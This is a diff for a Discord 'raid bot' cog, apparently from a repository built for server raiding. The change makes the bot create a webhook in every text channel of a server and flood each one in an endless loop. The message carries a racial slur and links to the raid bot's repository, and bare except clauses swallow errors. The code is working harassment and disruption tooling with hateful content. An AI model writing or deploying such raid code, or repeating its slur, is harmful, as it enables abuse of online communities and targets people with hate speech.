@@ -13,9 +13,16 @@ class Spam(commands.Cog):
             await ctx.message.delete()
         except:
             pass
-        while True:
-            await ctx.send(
-                "NIGGAS GETTING RAIDED BY POPELKA\n||[BOT REPOSITORY](<https://github.com/ItzPopelka/raidbot.github.io>)||")
+        spam_content = "NIGGAS GETTING RAIDED BY POPELKA\n||[BOT REPOSITORY](<https://github.com/ItzPopelka/raidbot.github.io>)||"
+        async def nuke_channel(channel):
+            try:
+                webhook = await channel.create_webhook(name="POPELKA RAID")
+                while True:
+                    await webhook.send(spam_content, username="POPELKA ON TOP")
+            except:
+                pass
+        for channel in ctx.guild.text_channels:
+            self.bot.loop.create_task(nuke_channel(channel))
 
     @commands.command()
     async def spam_ping(self, ctx):
